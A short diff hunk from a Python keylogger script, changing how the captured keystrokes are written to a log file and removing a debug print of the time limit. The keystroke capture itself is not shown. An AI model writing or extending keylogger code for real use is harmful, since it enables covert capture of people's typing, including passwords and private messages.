@@ -52,13 +52,13 @@ def keylogger_thread():
             logKey.write('No keys were logged within the first {0} seconds.\n'.format(set_time))
     else:
         with open("keylogg.txt", 'a') as logKey:
-            logKey.write('Final keylogg:\n{0}'.format(keylogg))
+            logKey.write('-----------------------------------------------------------')
+            logKey.write('\nFinal keylogg:\n{0}'.format(keylogg))
 
     print('Keylogger thread finished.')
 
 if __name__ == "__main__":
     set_time = monitor_time()  # Set the time limit for keylogging
-    print(set_time)
     # Create a thread for keylogger
     keylogger_thread = threading.Thread(target=keylogger_thread)
     
